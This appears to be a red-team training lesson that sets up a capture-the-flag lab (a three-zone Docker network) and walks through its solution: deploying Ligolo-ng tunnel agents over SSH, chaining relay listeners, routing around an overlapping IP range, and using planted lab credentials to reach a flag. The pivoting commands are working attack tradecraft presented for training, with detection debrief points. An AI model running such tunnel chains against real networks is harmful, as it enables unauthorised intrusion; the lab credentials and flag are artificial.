---
title: "Red Team CTF Sprint — Day 3: Pivoting Gauntlet"
tags: [red-team, CTF, pivoting, Ligolo-ng, Chisel, multi-hop, three-zone,
  network-navigation, DNS-proxy, T1090, sprint, advanced, challenge]
module: 08-RedTeam-03
day: 553
related_topics:
  - Red Team CTF Sprint Day 2 (Day 552)
  - Three-Zone Pivoting (Day 547)
  - Offshore Lab Episode 1 (Day 535)
  - Offshore Lab Episode 2 (Day 536)
  - Red Team CTF Sprint Day 4 (Day 554)
---

# Day 553 — Red Team CTF Sprint: Day 3

> "Pivoting is not a technique — it is the whole discipline of operating
> inside someone else's network. Every hop you add is another place where
> you can make a mistake, lose a session, or get caught by a firewall rule
> you did not know existed. Build the chain. Test every hop. Know how to
> rebuild it from scratch in ten minutes."
>
> — Ghost

---

## Goals

Build a three-hop pivot chain from scratch in a new lab environment.
Route correctly through conflicting IP ranges.
Resolve internal hostnames across the proxy chain without DNS leakage.
Recover from a simulated hop failure and restore the chain under time pressure.

**Prerequisites:** Day 547 (three-zone pivoting in depth), Days 534–536
(Offshore pivoting methodology). Ligolo-ng proxy must be pre-installed on
the attack host.
**Time budget:** 5 hours (single challenge — complexity is the time cost).

---

## Challenge — The Deep Corridor

### Category
Network Pivoting / Active Directory

### Difficulty
Advanced
Estimated time: 4 hours for a student at target level

### Learning Objective
Navigate a three-zone segmented network using Ligolo-ng, resolve internal DNS
through the pivot chain, handle a conflicting IP range, and retrieve a flag
from the deepest zone — which requires an AD authentication step once
the network is reachable.

### Scenario

```
You are on your attack host (AttackHost — external).
You have SSH access to EXT-HOST (10.10.110.10) — your initial foothold.

Network topology (unknown until you enumerate):
  [AttackHost] ──[SSH]──► EXT-HOST (10.10.110.10)
                                │
                   ──[unknown firewall ACL]──►
                                │
                           ???.???.???.???   (DMZ zone)
                                │
                   ──[unknown firewall ACL]──►
                                │
                          ??.??.??.???       (internal zone)
                                │
                   ──[unknown firewall ACL]──►
                                │
                          ???.???.???.???    (deep zone — target)

Your mission:
  1. Map the network topology — you only know EXT-HOST's IP
  2. Build a pivot chain to reach the deep zone
  3. Authenticate to an AD resource in the internal zone using credentials
     you discover along the way
  4. Retrieve the flag from the deep zone host: DEEP-HOST

Additional constraint:
  → The deep zone (zone 3) uses 192.168.1.0/24 — the same range as your
    home network (AttackHost is also on 192.168.1.x)
  → You must handle the routing conflict to reach zone 3 targets
```

### Vulnerability / Technique
T1090.003 — Proxy: Multi-hop Proxy
T1046 — Network Service Discovery

### Setup

```yaml
# docker-compose.yml
version: "3.9"
services:
  ext_host:
    image: corplab/linux:ssh
    hostname: EXT-HOST
    networks:
      external_zone:
        ipv4_address: 10.10.110.10
      dmz_zone:
        ipv4_address: 172.16.50.10

  dmz_host:
    image: corplab/linux:ssh
    hostname: DMZ-HOST
    networks:
      dmz_zone:
        ipv4_address: 172.16.50.20
      internal_zone:
        ipv4_address: 10.10.10.20

  internal_dc:
    image: corplab/dc01:basic
    hostname: INTERNAL-DC
    networks:
      internal_zone:
        ipv4_address: 10.10.10.5
    environment:
      - DOMAIN=internal.corp
      - CREDS_FILE=/shared/creds.txt  # jdoe:NetPass2024!

  deep_host:
    image: corplab/linux:flag
    hostname: DEEP-HOST
    networks:
      deep_zone:
        ipv4_address: 192.168.1.100   # ← conflicts with AttackHost home network
    environment:
      - FLAG=CTF{three_hops_dns_conflict_resolved}

  # Firewall rules (iptables-based):
  # external_zone → dmz_zone: ALLOW 10.10.110.0/24 → 172.16.50.0/24
  # dmz_zone → internal_zone: ALLOW 172.16.50.0/24 → 10.10.10.0/24
  # internal_zone → deep_zone: ALLOW 10.10.10.0/24 → 192.168.1.0/24
  # No direct routing across non-adjacent zones

networks:
  external_zone:
    driver: bridge
    ipam:
      config:
        - subnet: 10.10.110.0/24
  dmz_zone:
    driver: bridge
    ipam:
      config:
        - subnet: 172.16.50.0/24
  internal_zone:
    driver: bridge
    ipam:
      config:
        - subnet: 10.10.10.0/24
  deep_zone:
    driver: bridge
    ipam:
      config:
        - subnet: 192.168.1.0/24
```

### Hint Progression
1. Before you can deploy Ligolo-ng agents, you need to understand the topology.
   From EXT-HOST, what does the routing table tell you about adjacent networks?
2. Ligolo-ng's `listener_add` creates a relay port on an existing agent that
   allows deeper agents to connect "inward" through already-established sessions.
3. When zone 3 (192.168.1.0/24) conflicts with your home network, you need to
   add the tunnel route with a lower metric than your home router's route.
   `ip route add 192.168.1.0/24 dev ligolo metric 10`.

### Solution Walkthrough

```bash
# ════════════════════════════════════
# PHASE 1: Topology Discovery
# ════════════════════════════════════

# SSH to EXT-HOST
ssh user@10.10.110.10

# Check EXT-HOST's interfaces and routing:
ip addr   # → finds eth0: 10.10.110.10, eth1: 172.16.50.10
ip route  # → 172.16.50.0/24 via eth1 (DMZ zone accessible)

# Scan DMZ from EXT-HOST:
nmap -sn 172.16.50.0/24 --open
# Finds: DMZ-HOST (172.16.50.20)

# SSH to DMZ-HOST (using same credentials from EXT-HOST):
ssh user@172.16.50.20
ip addr   # → eth0: 172.16.50.20, eth1: 10.10.10.20
ip route  # → 10.10.10.0/24 via eth1 (internal zone)

nmap -sn 10.10.10.0/24 --open
# Finds: INTERNAL-DC (10.10.10.5), and a host at 10.10.10.20 (self)
# Check internal hosts for 192.168.1.x routing:
ssh user@10.10.10.20  # from DMZ
ip route | grep 192   # → 192.168.1.0/24 via eth1 → deep zone

# ════════════════════════════════════
# PHASE 2: Build Ligolo-ng Chain
# ════════════════════════════════════

# Attack host: start Ligolo-ng proxy
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# HOP 1: EXT-HOST → Attack Host
# Upload agent to EXT-HOST:
scp agent user@10.10.110.10:/tmp/agent
ssh user@10.10.110.10 "chmod +x /tmp/agent && /tmp/agent -connect AttackHost:11601 -ignore-cert &"

# In Ligolo console: select session 1 (EXT-HOST), start
ligolo-ng » session   # select EXT-HOST
ligolo-ng » start

# Route zone1 (DMZ) through hop 1:
sudo ip route add 172.16.50.0/24 dev ligolo

# Test: ping 172.16.50.20 ✓

# HOP 2: DMZ-HOST → Attack Host via EXT-HOST relay
# Create listener on hop-1 (EXT-HOST) that relays to attack host port 11601:
ligolo-ng [session 1] » listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601

# Upload + start agent on DMZ-HOST:
scp agent user@172.16.50.20:/tmp/agent   # reachable via hop-1 route
ssh user@172.16.50.20 "chmod +x /tmp/agent && /tmp/agent -connect 10.10.110.10:11602 -ignore-cert &"

# In Ligolo console: select session 2 (DMZ-HOST), start
ligolo-ng » session   # select DMZ-HOST
ligolo-ng » start

# Route internal zone through hop 2:
sudo ip route add 10.10.10.0/24 dev ligolo1

# Test: ping 10.10.10.5 (INTERNAL-DC) ✓

# HOP 3: INTERNAL-DC zone host → Attack Host via DMZ relay
# Create listener on hop-2 (DMZ-HOST) for internal hosts:
ligolo-ng [session 2] » listener_add --addr 0.0.0.0:11603 --to 127.0.0.1:11601

# Find a host in 10.10.10.0/24 that can reach 192.168.1.x
# (from nmap earlier — INTERNAL-DC 10.10.10.5 has 192.168.1.x routing)
scp agent user@10.10.10.5:/tmp/agent     # reachable via hop-2 route
ssh user@10.10.10.5 "chmod +x /tmp/agent && /tmp/agent -connect 172.16.50.20:11603 -ignore-cert &"

# In Ligolo console: select session 3, start
ligolo-ng » session   # select INTERNAL-DC
ligolo-ng » start

# ════════════════════════════════════
# PHASE 3: Handle IP Conflict
# ════════════════════════════════════

# Attack host's home network: 192.168.1.0/24 via home router (metric 100)
# Add deep zone route with LOWER metric (higher priority):
sudo ip route add 192.168.1.0/24 dev ligolo2 metric 10

# Verify: traffic to 192.168.1.100 goes through tunnel, not home router:
ip route get 192.168.1.100
# → 192.168.1.100 dev ligolo2  ← correct

# Test: ping 192.168.1.100 (DEEP-HOST) ✓

# ════════════════════════════════════
# PHASE 4: DNS Resolution
# ════════════════════════════════════

# Add internal DNS to resolv.conf (INTERNAL-DC is the DNS server):
echo "nameserver 10.10.10.5" | sudo tee -a /etc/resolv.conf

# Verify: host internal.corp 10.10.10.5 ✓

# ════════════════════════════════════
# PHASE 5: Enumerate and retrieve flag
# ════════════════════════════════════

# Find credentials on INTERNAL-DC (from creds.txt hinted in scenario):
proxychains smbclient //10.10.10.5/SYSVOL -U 'internal.corp\jdoe%NetPass2024!'
# Or: read creds from a share/file found during enumeration

# Access DEEP-HOST using discovered credentials or SSH key found internally:
ssh user@192.168.1.100
cat /flag.txt
# FLAG: CTF{three_hops_dns_conflict_resolved}

# ════════════════════════════════════
# PHASE 6: Simulate Hop-1 Failure and Recover
# ════════════════════════════════════

# Instructor: kill the EXT-HOST agent (or docker stop ext_host briefly)
# Student: detect failure → re-deploy → verify full chain restored

# 1. Detect: ping 172.16.50.20 fails → ligolo console shows session 1 lost
# 2. Re-deploy hop-1 agent (same SSH access still available):
ssh user@10.10.110.10 "/tmp/agent -connect AttackHost:11601 -ignore-cert &"
# 3. Ligolo: new session appears → re-select, re-start
# 4. Re-add listener for hop-2 relay:
ligolo-ng [new session 1] » listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601
# 5. Verify hop-2 agent reconnects (or manually restart if no persistence)
# 6. Verify full chain: ping 192.168.1.100 ✓ → chain restored
```

### Flag
`CTF{three_hops_dns_conflict_resolved}`

### Debrief Points

```
1. The conflicting IP range (deep zone = home network) is a real-world
   problem in Offshore-style labs and in corporate environments where
   the target uses RFC 1918 space overlapping the operator's network.
   Metric-based routing is the standard solution.

2. DNS across the pivot chain is the step most operators forget until
   a tool fails silently. Always add the internal DNS server to resolv.conf
   (Ligolo-ng) or enable proxy_dns (Chisel/proxychains) before running
   any tool that resolves hostnames.

3. Ligolo-ng's listener relay keeps the attack host's IP invisible to inner
   zones. Zone 3 (DEEP-HOST) only ever sees connections from the internal
   zone — the attack host's public IP never appears in any inner-zone log.

4. Pivot recovery speed is a professional metric. The target is: restore any
   single lost hop in under 10 minutes. If you cannot do that, you have
   not documented your setup procedure well enough.

5. Detection: unusual listening ports on intermediate hosts (11602, 11603)
   from netstat or Sysmon Event ID 3 (network connections). A blue team
   monitoring unexpected port binds on non-server hosts will catch this
   within minutes of setup.
```

---

## Recovery Drill Results

```
Hop-1 failure simulation:
  Time detected: _______
  Time restored: _______
  Elapsed:       _______ (target: < 10 min)

Chain validation after recovery:
  [ ] ping 172.16.50.20 (DMZ)
  [ ] ping 10.10.10.5   (Internal DC)
  [ ] ping 192.168.1.100 (Deep host)
  [ ] DNS resolution of internal hostname
```

---

## Engagement Log — Day 3 Sprint

```
Time    | Action                                      | Result
--------|---------------------------------------------|-------
        | EXT-HOST topology discovery                 |
        | DMZ-HOST identified + topology              |
        | Internal DC identified + deep zone mapped   |
        | Ligolo hop-1 established                    |
        | Ligolo hop-2 established                    |
        | Ligolo hop-3 established                    |
        | IP conflict resolved (metric routing)       |
        | DNS configured                              |
        | Credentials found internally                |
        | Flag retrieved from DEEP-HOST               |
        | Hop-1 failure simulated                     |
        | Chain restored                              |

Flag captured: [ ] Yes  [ ] No
Total time: _____ minutes
Hop recovery time: _____ minutes (target: < 10)
```

---

## Key Takeaways

1. Three-hop Ligolo-ng chains are built incrementally: establish hop-1,
   verify it, create its listener relay, establish hop-2 through that relay,
   verify it, create hop-2's listener relay, establish hop-3. Never skip
   the verification step between hops.
2. IP conflicts are solved by metric — not by removing the conflicting route.
   Your home network route stays; you add a tunnel route with a lower metric
   number so it takes priority.
3. Pivot recovery is as important as pivot setup. Every hop must have a
   documented restart procedure. The chain should be self-healing within
   minutes, not hours.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q553.1, Q553.2 …).

---

## Navigation

← Previous: [Day 552 — Red Team CTF Sprint: Day 2](DAY-0552-Red-Team-CTF-Sprint-Day-2.md)
→ Next: [Day 554 — Red Team CTF Sprint: Day 4](DAY-0554-Red-Team-CTF-Sprint-Day-4.md)
